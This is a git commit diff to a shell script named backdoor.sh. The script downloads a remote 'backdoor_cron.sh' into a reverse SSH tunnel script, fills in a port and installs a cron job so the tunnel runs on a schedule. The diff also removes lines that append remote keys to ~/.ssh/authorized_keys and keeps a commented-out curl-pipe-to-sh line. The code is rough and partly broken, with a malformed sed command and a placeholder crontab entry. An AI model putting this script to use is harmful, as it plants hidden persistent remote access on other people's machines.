bc438da8b815ef19ea2e3459e5d837148f8dc2af
tpanum <thomas@panum.dk>
2016-07-14 14:39:51 +0200

    Added first version

--- backdoor.sh
+++ backdoor.sh
@@ -2,6 +2,10 @@
 if [ "$1" == "" ]; then
     echo "Missing argument port"
 else
-    curl https://github.com/tpanum >> ~/.ssh/authorized_keys
-    curl https://github.com/tpanum.keys > reverse_tunnel_.sh
+#    curl https://raw.githubusercontent.com/tpanum/sh/master/add_key.sh | sh
+    curl https://raw.githubusercontent.com/tpanum/sh/master/scripts/backdoor_cron.sh > reverse_tunnel_port_$1.sh
+    sed -i 's/{{@PORT}}/$1/g/' reverse_tunnel_port_$1.sh
+    FILE=$(readlink -f reverse_tunnel_port_$1.sh)
+    CRON_QUERY="*/5 * * * * /bin/sh /home/username/reverse_ssh_tunnel.sh"
+    (crontab -l ; echo "0 * * * * your_command") | sort - | uniq - | crontab -
 fi
